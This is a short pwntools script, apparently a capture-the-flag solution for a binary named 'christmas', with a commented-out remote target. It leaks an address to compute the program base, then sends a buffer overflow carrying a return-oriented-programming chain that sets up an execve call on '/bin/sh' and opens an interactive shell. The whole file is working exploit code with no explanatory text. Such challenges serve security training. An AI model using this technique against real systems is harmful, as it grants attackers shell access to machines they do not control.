from pwn import *

p = process('./dist/christmas')
e = p.elf
#p = remote('cbactf.com', 5000)

gadget = lambda x: p32(next(e.search(asm(x, os='linux', arch=e.arch))))

p.recvuntil('0x')
e.address = int(p.recvline(), 16) - e.symbols['meme']
log.info('Base is 0x%x' % e.address)

p.recvuntil('Maybe a ')

payload = 27 * b'A'
payload += gadget('xor ecx, ecx; ret')
payload += gadget('mov eax, 0; mov edx, 0; ret')
payload += gadget('pop ebx; ret') + p32(next(e.search(b'/bin/sh')))
payload += gadget('add eax, 1; ret') * 0xb
payload += gadget('int 0x80; ret;')

p.sendline(payload)
p.interactive()
